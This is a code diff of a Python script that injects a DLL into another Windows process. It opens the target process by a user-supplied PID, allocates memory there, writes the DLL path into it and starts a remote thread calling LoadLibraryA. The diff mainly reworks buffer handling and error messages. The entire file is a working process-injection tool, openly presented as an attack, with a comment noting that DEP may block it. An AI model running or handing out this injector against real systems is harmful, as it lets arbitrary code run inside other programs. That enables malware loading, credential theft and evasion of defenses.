@@ -6,6 +6,8 @@ from ctypes import *
 
 #Windows Constants
 """
+Please note that DEP will most likely prevent this kind of attack
+
 PAGE_READWRITE = 0x04 : This is a standard memory protection used with VirtualAllocEx. It gives us Read and Write permissions in an assingned memory space but not execution.
 
 MEM_COMMIT | MEM_RESERVE = Used with VirtualAllocEx to reserve an address range and commit physical memory in a single call. 0x1000 represents MEM_COMMIT and 0x2000 represents MEM_RESERVE.
@@ -26,7 +28,6 @@ kernel32 = ctypes.windll.kernel32
 def get_user_int(prompt):
     global pid
     global ddl_path
-    global dll_len
     while True:
         try:
             user_input = input(prompt)
@@ -36,46 +37,52 @@ def get_user_int(prompt):
             print("[!] Invalid input")
 
 pid = get_user_int("[>] Please provide the Process PID you wish to inject to: ")
-dll_pathinput = input("[>] Please provide the path to your DLL. Format Example(C:\\path\\to\\your.dll): ")
-dll_path = dll_pathinput.encode("utf-8")
-dll_len = len(dll_path) + 1
+dll_path = input("[>] Please provide the path to your DLL!!!\n[>] Format Example(C:\\path\\to\\your.dll): ")
+
+#You can change the encoding here. For example swap to ASCII
+encoding = 'utf-8'
+
+#DLL loaded as a ctype for easier payload delivery
+buffer = ctypes.create_string_buffer(dll_path.encode(encoding))
 
 if pid is not None:
     print(f"[>] PID captured as {pid}")  
-if dll_pathinput is not None:
-    print(f"[>] Path to DLL captured as {dll_pathinput} at {dll_len} in length \n[!!!]Bytes:{list(dll_path)}[!!!]")
+if dll_path is not None:
+    print(f"[>] Path to DLL captured as {dll_path}")
+    print(f"[>] Information: {buffer}")
 
 #where the actual injection code is
-def inject_dll(pid, dll_path,dll_len):
+def inject_dll(pid, buffer):
 
 #Open host process 
     host_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, (pid))
     if not host_process:
         print(f"[!] Failed to open process {pid}")
-        return False
+        sys.exit(0)
 #Allocate memory in the host process with the rights mentioned above for the Dll path        
     arg_address = kernel32.VirtualAllocEx(
         host_process, 
         0, 
-        dll_len, 
+        ctypes.sizeof(buffer), 
         MEM_COMMIT | MEM_RESERVE, 
         PAGE_READWRITE
     )
 #Write the Dll Path into allocated memory
-    written = c_int(0)
+    written = ctypes.c_size_t(0)
     kernel32.WriteProcessMemory(
         host_process, 
         arg_address, 
-        dll_path, 
-        dll_len, 
-        byref(written)
+        buffer, 
+        ctypes.sizeof(buffer), 
+        ctypes.byref(written)
     )
-#creating a remote thread to call to LoadLibrary
+#Get address of LoadLibraryA
     h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
     h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
-    thread_id = c_ulong(0)
 
-    if not kernel32.CreateRemoteThread(
+#Create remote thread and if it fails print the error   
+    thread_id = wintypes.DWORD(0)
+    hThread = kernel32.CreateRemoteThread(
         host_process, 
         None, 
         0, 
@@ -83,27 +90,32 @@ def inject_dll(pid, dll_path,dll_len):
         arg_address, 
         0, 
         byref(thread_id)
-    ):
-        print("[!] Failed to create remote thread")
+    )
+    if not hThread:
+        print(f"[!] Failed remote thread: {kernel32.GetLastError()}")
         return False
+    else:
+        print(f"[>] DLL injected successfully into PID {pid}") 
+        print(f"[>] Remote Thread Creation Successful!\n[>] REMOTE THREAD ID: {thread_id.value}")
+        return True
 
-    print(f"[+] DLL injected successfully into PID {pid}")
-    return True
+   
+    
 
 if __name__ == "__main__":
-    if os.path.exists(dll_pathinput):
-        inject_dll(pid, dll_path, dll_len)
+    if os.path.exists(dll_path):
+        inject_dll(pid, buffer)
     else:
         print("[!] DLL file not found")     
 
 while True:
     exit_input = input("[>] Please Enter 'exit' to stop): ")
-     
     if exit_input.lower() == "exit":
          print("[>] Exiting Program")
          break
          sys.exit(0)
     else:
          print("[>] Please enter 'exit' to stop")
+
 
 
